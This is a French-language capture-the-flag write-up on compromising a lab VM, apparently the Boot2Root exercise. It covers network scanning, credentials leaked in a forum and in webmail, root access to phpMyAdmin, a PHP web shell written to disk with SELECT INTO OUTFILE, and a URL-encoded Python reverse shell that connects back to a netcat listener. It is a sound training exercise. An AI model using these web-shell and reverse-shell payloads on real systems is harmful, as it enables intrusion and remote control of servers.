### PRECISION

TOUTES LES COMMANDES EXECUTEES ULTERIEUREMENT SONT DEPENDANTE DU RESEAU SUR LEQUEL NOUS SOMMES. LES ADRESSES IP PEUVENT CHANGER, AUQUEL CAS IL FAUDRA ADAPTER NOS COMMANDES

### Début

Lorsque nous lancons la VM nous remarquons qu'aucune adresse IP nous est fournie.
Nous allons donc devoir scanner notre reseau pour voir les adresses utilisées.

```
nmap -sn 192.168.1.0/24
Nmap scan report for BornToSecHackMe (192.168.1.50)
nmap 192.168.1.50
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-09 14:57 CEST
Nmap scan report for BornToSecHackMe (192.168.1.50)
Host is up (0.00096s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 1 IP address (1 host up) scanned in 4.63 seconds
```
Nous voyons donc plusieurs ports ouverts pour cette adresse IP dont notamment les 80 et 443 qui correspondent au protocol http et https ainsi que le port 21 et 22 qui correspondent au ftp et ssh respectivement.

Dans Kali Linux nous avons deux outils utils pour la recherche de vulnerabilites web que nous avons deja utilisés pour Darkly :
Nikto qui est un outil pour scanner les vulnerabilites de serveur web
Dirb quiu va chercher les routes existantes ou cachées.
```
nikto -h https://192.168.1.50

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.50
+ Target Hostname:    192.168.1.50
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=BornToSec
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /CN=BornToSec
+ Start Time:         2021-08-09 09:06:32 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Hostname '192.168.1.50' does not match certificate's names: BornToSec
+ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.20
+ Cookie PHPSESSID created without the secure flag
+ Cookie PHPSESSID created without the httponly flag
+ Cookie mlf2_usersettings created without the secure flag
+ Cookie mlf2_usersettings created without the httponly flag
+ Cookie mlf2_last_visit created without the secure flag
+ Cookie mlf2_last_visit created without the httponly flag
+ OSVDB-3092: /forum/: This might be interesting...
+ Cookie SQMSESSID created without the secure flag
+ Cookie SQMSESSID created without the httponly flag
+ OSVDB-3093: /webmail/src/read_body.php: SquirrelMail found
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 47542, size: 5108, mtime: Tue Aug 28 06:48:10 2007
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 8876 requests: 0 error(s) and 24 item(s) reported on remote host
+ End Time:           2021-08-09 09:09:40 (GMT-4) (188 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Nous voyons ici plusieurs routes que nous allons explorer pour voir si nous trouvons quelque chose d'interessant. La premiere étant /forum/:

### Forum

![b2r_1](./photos/b2r_1.png)

En fouillant un peu dans la section 'Probleme login ?' nous trouvons quelque chose d'interessant : 
```
curl --insecure https://192.168.1.50/forum/index.php\?id\=6 | grep "invalid user"
Oct  5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2<br />
```
Grace a ce mot de passe nous pouvons nous connecter sur le forum avec le couple lmezard/!q\]Ej?*5K5cy*AJ

Nous pouvons recuperer alors l'adresse mail associé a cet identifiant : laurie@borntosec.net

### Webmail

Lorsque nous nous connectons, nous voyons la présence d'un mail DB access avec une pair root/Fg-'kKXBj87E:aJ$. 
```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```
Connectons nous alors a la db via phpmyadmin

### phpMyAdmin

Nous arrivons donc a nous connecter a la db en tant que root grace au mdp fourni sur la boite mail de lmezard.

La technique la plus repandue la est de creer une backdoor dans un repertoire existant pour apres en chargeant la page adequat pourvoir executer un shell sur notre terminal

```
dirb https://192.168.1.50/forum

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Aug  9 09:59:40 2021
URL_BASE: https://192.168.1.50/forum/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.1.50/forum/ ----
+ https://192.168.1.50/forum/backup (CODE:403|SIZE:293)
+ https://192.168.1.50/forum/config (CODE:403|SIZE:293)
==> DIRECTORY: https://192.168.1.50/forum/images/
==> DIRECTORY: https://192.168.1.50/forum/includes/
+ https://192.168.1.50/forum/index (CODE:200|SIZE:4935)
+ https://192.168.1.50/forum/index.php (CODE:200|SIZE:4935)
==> DIRECTORY: https://192.168.1.50/forum/js/
==> DIRECTORY: https://192.168.1.50/forum/lang/
==> DIRECTORY: https://192.168.1.50/forum/modules/
==> DIRECTORY: https://192.168.1.50/forum/templates_c/
==> DIRECTORY: https://192.168.1.50/forum/themes/
==> DIRECTORY: https://192.168.1.50/forum/update/
```
On va essayer de placer notre backdoor dans un de ces repertoires : /forum/templates_c apres avoir cree une nouvelle db que jai nommé b2r
```
select "<?php system($_GET['cmd']); ?>" into outfile "https://192.168.1.50/var/www/forum/templates_c/backdoor.php"
```

![b2r_2](./photos/b2r_2.png)

https://192.168.1.50/forum/templates_c/backdoor.php?cmd=whoami nous donne :
```
www-data
```
Notre backdoor fonctionne correctement.

Ce que nous devons faire maintenant est de trouver un reverse shell que nous pourrons executer pour pouvoir se connecter au serveur. En cherchant sur internet il y a des reverse shell deja tout prets, prenons celui en python :

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.28",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Pour pouvoir passer ce reverse shell a notre url il faudra l'encoder :
```
python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.1.28%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27%0A
```
 On va attendre la connexion sur notre machine Kali (machine qui a l'adresse correspondante a celle rentrée dans le reverse shell)
 ```
 nc -l -p 1234
 ```
D'une autre machine ou directement depuis le browser rentrer le reverse shell encode apres le cmd :

```
curl --insecure https://192.168.1.50/forum/templates_c/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.1.28%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27%0A
```

Nous obtenons bien un nouveau prompt : 
```
$ whoami
www-data
$ uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```

### WWWW-DATA

La premiere idée qui me vient est d'essayer de faire une injection dynamique de librairie des plus classiques comme pour le level13 de snowcrash.

Cependant apres avoir execute l'injection, nous avons bien les droits root mais impossible d'acceder au dossier /root ??

